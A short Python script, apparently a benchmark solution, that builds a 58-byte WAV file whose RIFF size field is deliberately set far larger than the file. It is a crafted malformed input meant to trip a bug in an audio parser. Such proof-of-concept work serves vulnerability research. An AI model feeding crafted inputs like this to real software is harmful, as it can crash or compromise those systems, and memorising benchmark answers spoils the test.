import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        riff_size = 0x00010000  # Deliberately larger than actual file size
        fmt_size = 16
        audio_format = 1
        channels = 1
        sample_rate = 8000
        bits_per_sample = 8
        byte_rate = sample_rate * channels * bits_per_sample // 8
        block_align = channels * bits_per_sample // 8

        data_content = b'\x00' * 14  # Keep total file length at 58 bytes
        data_size = len(data_content)

        header = b'RIFF' + struct.pack('<I', riff_size) + b'WAVE'
        fmt_chunk = b'fmt ' + struct.pack('<I', fmt_size) + struct.pack('<HHIIHH',
                                                                        audio_format,
                                                                        channels,
                                                                        sample_rate,
                                                                        byte_rate,
                                                                        block_align,
                                                                        bits_per_sample)
        data_chunk = b'data' + struct.pack('<I', data_size) + data_content

        return header + fmt_chunk + data_chunk